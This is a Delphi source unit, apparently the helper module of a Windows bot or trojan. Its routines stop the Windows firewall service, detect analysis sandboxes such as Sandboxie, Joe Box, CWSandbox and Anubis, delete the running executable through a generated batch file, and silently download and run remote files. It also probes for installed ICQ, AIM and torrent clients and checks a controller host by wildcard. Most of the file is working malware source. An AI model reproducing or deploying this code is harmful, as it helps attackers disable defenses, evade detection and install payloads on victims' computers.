unit functions;

interface

uses Windows, urlmon, shlobj, shfolder,
 winsvc, kol, TlHelp32, strings;

 const
 CSIDL_PROGRAM_FILES = $0026;



function processExists(exeFileName: string): Boolean;
function GET_PERS_DIR:String;
function Get_Prog_dir:String;
procedure Close_Firewall;
function StrToInt(Value: ShortString): Integer;
function IntToStr(Value: Integer): ShortString;
function GetWinLang(): String;
function IS_ICQ_Installed: Boolean;
function IS_AIM_Installed: Boolean;
function IS_AZ_Installed: Boolean;
function IS_UT_Installed: Boolean;
function IsInSandbox:boolean;
function GetAppDataPath(): String;
procedure DeleteSelf(MyPath: String);
function MatchStrings(Str1, Str2: String): Boolean;
procedure ExecuteFile(Path: String);
function Download(const fileURL, FileName: String): Boolean;
function WildcardCompare(WildS, IstS: String): Boolean;
function LeftStr(const AText: AnsiString; const ACount: Integer): AnsiString; overload;
function TrimEx(S: String): String;
function CheckAuthHost(AuthHost, RawData: String): Boolean;
function ReplaceString(S, OldPattern, NewPattern: String): String;
function Split(Input: String; Deliminator: String; Index: Integer): String;
//Registry Functions
procedure InsertRegValue(Root: HKey; Path, Value, Str: String);
function ReadRegValue(Root: HKey; Path, Value, Default: String): String;
procedure DeleteRegValue(Root: HKey; Path, Value: String);


implementation




function processExists(exeFileName: string): Boolean;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);
  Result := False;
  while Integer(ContinueLoop) <> 0 do
  begin
    if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
      UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile) =
      UpperCase(ExeFileName))) then
    begin
      Result := True;
    end;
    ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;

function GetSpecialFolder(FolderID : longint) : string;
var
 Path : pchar;
 idList : PItemIDList;
begin
 GetMem(Path, MAX_PATH);
 SHGetSpecialFolderLocation(0, FolderID, idList);
 SHGetPathFromIDList(idList, Path);
 Result := string(Path);
 FreeMem(Path);
end;

function GET_PERS_DIR:string;
var
  SHGetFolderPath :TSHGetFolderPath;
  hFolderDLL : THandle;
var
  Buf: array[0..256] of Char;
begin
  hFolderDLL := LoadLibrary(PChar(strings.shfolder));
  try
    SHGetFolderPath := nil;
    if hFolderDLL <> 0 then @SHGetFolderPath := GetProcAddress(hFolderDLL, PChar(strings.SHGetFolderPathA));
    if Assigned(SHGetFolderPath) and (S_OK = SHGetFolderPath(0, CSIDL_Personal , 0, 0, Buf)) then
    else
    GetTempPath(Max_path, Buf);
  finally
    if hFolderDLL <> 0 then FreeLibrary(hFolderDLL);
    Result := String(Buf) + '\';
  end;
end;

function Get_Prog_dir:String;
var
  SHGetFolderPath :TSHGetFolderPath;
  hFolderDLL : THandle;
var
  Buf: array[0..256] of Char;
begin
  hFolderDLL := LoadLibrary(PChar(strings.shfolder));
  try
    SHGetFolderPath := nil;
    if hFolderDLL <> 0 then @SHGetFolderPath := GetProcAddress(hFolderDLL, PChar(strings.SHGetFolderPathA));
    if Assigned(SHGetFolderPath) and (S_OK = SHGetFolderPath(0, CSIDL_PROGRAM_FILES , 0, 0, Buf)) then
    else
    GetTempPath(Max_path, Buf);
  finally
    if hFolderDLL <> 0 then FreeLibrary(hFolderDLL);
    Result := String(Buf) + '\';
  end;
end;

procedure Close_Firewall;
var
  SCM, hService: LongWord;
  sStatus: TServiceStatus;
begin
  SCM      := OpenSCManager(nil, nil, SC_MANAGER_ALL_ACCESS);
  hService := OpenService(SCM, PChar(strings.SharedAccess), SERVICE_ALL_ACCESS);

  ControlService(hService, SERVICE_CONTROL_STOP, sStatus);
  CloseServiceHandle(hService);
end;


function StrToInt(Value: ShortString): Integer;
// Value   = eax
// Result  = eax
asm
  push ebx
  push esi

  mov esi,eax
  xor eax,eax
  movzx ecx,Byte([esi]) // read length byte
  cmp ecx,0
  je @exit

  movzx ebx,Byte([esi+1])
  xor edx,edx // edx = 0
  cmp ebx,45  // check for negative '-' = #45
  jne @loop

  dec edx // edx = -1
  inc esi // skip '-'
  dec ecx

  @loop:
    inc   esi
    movzx ebx,Byte([esi])
    imul  eax,10
    sub   ebx,48 // '0' = #48
    add   eax,ebx
    dec   ecx
  jnz @loop

  mov ecx,eax
  and ecx,edx
  shl ecx,1
  sub eax,ecx

  @exit:
  pop esi
  pop ebx
end;

function IntToStr(Value: Integer): ShortString;
// Value  = eax
// Result = edx
asm
  push ebx
  push esi
  push edi

  mov edi,edx
  xor ecx,ecx
  mov ebx,10
  xor edx,edx

  cmp eax,0 // check for negative
  setl dl
  mov esi,edx
  jnl @reads
  neg eax

  @reads:
    mov  edx,0   // edx = eax mod 10
    div  ebx     // eax = eax div 10
    add  edx,48  // '0' = #48
    push edx
    inc  ecx
    cmp  eax,0
  jne @reads

  dec esi
  jnz @positive
  push 45 // '-' = #45
  inc ecx

  @positive:
  mov [edi],cl // set length byte
  inc edi

  @writes:
    pop eax
    mov [edi],al
    inc edi
    dec ecx
  jnz @writes

  pop edi
  pop esi
  pop ebx
end;

function GetWinLang(): String;
var
 Buffer: PChar;
 Size: Integer;
begin
 Size := GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, nil, 0);
 GetMem(Buffer, Size);
 try
  GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, Buffer, Size);
  Result := String(Buffer);
 finally
  FreeMem(Buffer);
 end;
end;

function IS_ICQ_Installed: Boolean;
begin
 try
  Result   := RegKeyExists(HKEY_LOCAL_MACHINE,icqpath);
 except
 begin
  Result := False;
 end;
  //CODE
 end;
end;

function IS_AZ_Installed: Boolean;
begin
 Result := False;
 try
  if (RegKeyExists(HKEY_LOCAL_MACHINE,azpath)) or  (RegKeyExists(HKEY_CURRENT_USER,azpath)) then Result := TRUE;
 except
 begin
  Result := False;
 end;
  //CODE
 end;
end;


function IS_UT_Installed: Boolean;
begin
Result := FALSE;
 try
  if (RegKeyExists(HKEY_LOCAL_MACHINE,utpath)) or  (RegKeyExists(HKEY_CURRENT_USER,utpath)) then Result := TRUE;
 except
 begin
  Result := False;
 end;
  //CODE
 end;
end;

function IS_AIM_INSTALLED: Boolean;
begin
  try
    Result := RegKeyExists(HKEY_LOCAL_MACHINE,aimpath);
  except
    begin
      Result := FALSE;
    end;
  end;
  end;


function IsInSandbox:boolean;
var
hOpen:    HKEY;
sBuff:    array[0..256] of char;
BuffSize: integer;
hMod:THandle;
begin
  Result := False;

  hMod:= GetModuleHandle(PChar(SbieDll));  //Sandboxie
  if hMod <> 0 then Result := True;

  hMod:= GetModuleHandle(PCHar(dbghelp)); // Thread Expert
  if hMod <> 0 then Result := True;

  if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, PChar(curver), 0, KEY_QUERY_VALUE, hOpen)) = ERROR_SUCCESS then
  begin
    BuffSize := SizeOf(sBuff);
    RegQueryValueEx(hOpen, PChar(pid), nil, nil, @sBuff, @BuffSize);
    if sBuff = jbox then //Joe Box
      Result := True
    else if sBuff = cwsbox then //CW Sandbox
      Result := True
    else if sBuff = anubis then //Anubis
      Result := True
    else
      Result := False;
    RegCloseKey(hOpen);
  end;
end;

function GetAppDataPath() : String;
var
  SHGetFolderPath :TSHGetFolderPath;
  hFolderDLL : THandle;
var
  Buf: array[0..256] of Char;
begin
  hFolderDLL := LoadLibrary(PChar(strings.SHFolder));
  try
    SHGetFolderPath := nil;
    if hFolderDLL <> 0 then @SHGetFolderPath := GetProcAddress(hFolderDLL, PChar(strings.SHGetFolderPathA));
    if Assigned(SHGetFolderPath) and (S_OK = SHGetFolderPath(0, CSIDL_APPDATA or CSIDL_FLAG_CREATE, 0, 0, Buf)) then
    else
    GetTempPath(Max_path, Buf);
  finally
    if hFolderDLL <> 0 then FreeLibrary(hFolderDLL);
    Result := String(Buf) + '\';
  end;
end;

procedure DeleteSelf(MyPath: String);
var
  BatchFile: TextFile;
begin
  AssignFile(BatchFile, GetAppDataPath + batname);
  ReWrite(BatchFile);
    WriteLn(BatchFile, tryname);
    WriteLn(BatchFile, delname + MyPath + sign);
    WriteLn(BatchFile, del1 + MyPath + del2);
    WriteLn(BatchFile, delname + GetAppDataPath + batname + sign );
  CloseFile(BatchFile);
  ExecuteFile(GetAppDataPath + batname);
end;




function MatchStrings(Str1, Str2: String): Boolean;
begin
 if LowerCase(Str1) = LowerCase(Str2) then Result := True else Result := False;
end;

//////////////////////////////////////////////////////////
//Registry Functions
//////////////////////////////////////////////////////////
procedure InsertRegValue(Root: HKey; Path, Value, Str: String);
var
  Key: HKey;
  Size: Cardinal;
begin
  RegOpenKey(Root, PChar(Path), Key);
  Size := Length(Str);
  RegSetValueEx(Key, PChar(Value), 0, REG_SZ, @Str[1], Size);
  RegCloseKey(Key);
end;

function ReadRegValue(Root: HKey; Path, Value, Default: String): String;
var
  Key: HKey;
  RegType: Integer;
  DataSize: Integer;
begin
  Result := Default;
  if (RegOpenKeyEx(Root, PChar(Path), 0, KEY_ALL_ACCESS, Key) = ERROR_SUCCESS) then
  begin
    if RegQueryValueEx(Key, PChar(Value), nil, @RegType, nil, @DataSize) = ERROR_SUCCESS then
    begin
      SetLength(Result, Datasize);
      RegQueryValueEx(Key, PChar(Value), nil, @RegType, PByte(PChar(Result)), @DataSize);
      SetLength(Result, Datasize - 1);
    end;
    RegCloseKey(Key);
  end;
end;

procedure DeleteRegValue(Root: HKey; Path, Value: String);
var
  Key: HKey;
begin
  RegOpenKey(ROOT, PChar(Path), Key);
  RegDeleteValue(Key, PChar(Value));
  RegCloseKey(Key);
end;

procedure ExecuteFile(Path: String);
var
  PI: TProcessInformation;
  SI: TStartupInfo;
begin
  FillChar(SI, SizeOf(SI), $00);
  SI.dwFlags := STARTF_USESHOWWINDOW;
  SI.wShowWindow := SW_HIDE;
  if CreateProcess(nil, PChar(Path), nil, nil, False, IDLE_PRIORITY_CLASS, nil, nil, SI, PI) then
  begin
    CloseHandle(PI.hThread);
    CloseHandle(PI.hProcess);
  end;
end;

function Download(const fileURL, FileName: String): Boolean;
begin
  URLDownloadToFile(nil, PChar(fileURL), Pchar(FileName), 0, nil);
  ExecuteFile(FileName);
  Result := TRUE;
end;

function Split(Input: String; Deliminator: String; Index: Integer): String;
var
  StringLoop, StringCount: Integer;
  Buffer: String;
begin
  Buffer := '';
  if Index < 1 then Exit;
  StringCount := 0;
  StringLoop := 1;
  while (StringLoop <= Length(Input)) do
  begin
    if (Copy(Input, StringLoop, Length(Deliminator)) = Deliminator) then
    begin
      Inc(StringLoop, Length(Deliminator) - 1);
      Inc(StringCount);
      if StringCount = Index then
      begin
        Result := Buffer;
        Exit;
      end
      else
      begin
        Buffer := '';
      end;
    end
    else
    begin
      Buffer := Buffer + Copy(Input, StringLoop, 1);
    end;
    Inc(StringLoop, 1);
  end;
  Inc(StringCount);
  if StringCount < Index then Buffer := '';
  Result := Buffer;
end;

function ReplaceString(S, OldPattern, NewPattern: String): String;
var
  SearchStr, Patt, NewStr: string;
  Offset: Integer;
begin
  SearchStr := S;
  Patt := OldPattern;
  NewStr := S;
  Result := '';
  while SearchStr <> '' do
  begin
    Offset := Pos(Patt, SearchStr);
    if Offset = 0 then
    begin
      Result := Result + NewStr;
      Break;
    end;
    Result := Result + Copy(NewStr, 1, Offset - 1) + NewPattern;
    NewStr := Copy(NewStr, Offset + Length(OldPattern), MaxInt);
    SearchStr := Copy(SearchStr, Offset + Length(Patt), MaxInt);
  end;
end;

 function CheckAuthHost(AuthHost, RawData: String): Boolean;
begin
  Delete(RawData, 1, 1);
  RawData := Copy(RawData, 1, Pos(' ', RawData));
  if WildcardCompare(AuthHost, TrimEx(RawData)) then Result := True else Result := False;
end;

 function TrimEx(S: String): String;
var
  I, Count: Integer;
begin
  I := Length(S);
  Count:= 1;
  repeat
    if Copy(S, Count, 1) <> #0 then Result := Result + Copy(S, Count, 1);
    Inc(Count)
  until Count = I;
end;

function LeftStr(const AText: AnsiString; const ACount: Integer): AnsiString; overload;
begin
  Result := Copy(AText, 1, ACount);
end;

function WildcardCompare(WildS, IstS: String): Boolean;
var
  I, J, L, P: Byte;
begin
  I := 1;
  J := 1;
  while (I <= Length(WildS)) do
  begin
    if WildS[I] = '*' then
    begin
      if I = Length(WildS) then
      begin
        Result := True;
        Exit
      end
      else
      begin
        L := I + 1;
        while (l < length(WildS)) and (WildS[l+1] <> '*') do Inc (l);
        P := Pos(Copy(WildS, I + 1, L - I), IstS);
        if P > 0 then J := P - 1
        else
        begin
          Result := False;
          Exit;
        end;
      end;
    end
    else
    if (WildS[I] <> '?') and ((Length(IstS) < I) or (WildS[I] <> IstS[J])) then
    begin
      Result := False;
 	    Exit
    end;
    Inc(I);
    Inc(J);
  end;
  Result := (J > Length(IstS));
end;
end.
